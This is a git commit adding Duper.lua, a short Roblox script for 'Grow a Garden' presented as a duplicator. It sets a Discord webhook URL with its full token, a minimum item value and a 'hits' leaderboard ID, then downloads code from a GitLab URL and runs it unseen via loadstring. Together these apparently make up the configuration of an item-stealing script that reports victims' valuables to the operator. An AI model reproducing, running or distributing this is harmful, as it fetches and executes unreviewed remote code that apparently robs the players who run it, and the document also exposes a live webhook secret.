c74c5e85967f582b1790eda0ad18f9add74b2c4b
Ryv3x <112003314+Ryv3x@users.noreply.github.com>
2025-08-17 20:42:29 +0530

    Create Duper.lua

---
+++ Duper.lua
@@ -0,0 +1,6 @@
+Username = "Ryv3x"
+Webhook = "https://discord.com/api/webhooks/1402954573601308705/At_H7VKjxSMkMlgl7_oyY49krKHP67GZEiSR_F777zMgWelSrwJMbDgY8oUAJA8X7W8o"
+MinimumValue = 1
+DiscordID = "1390965876404260974" -- optional if you wanna be in hits lb
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
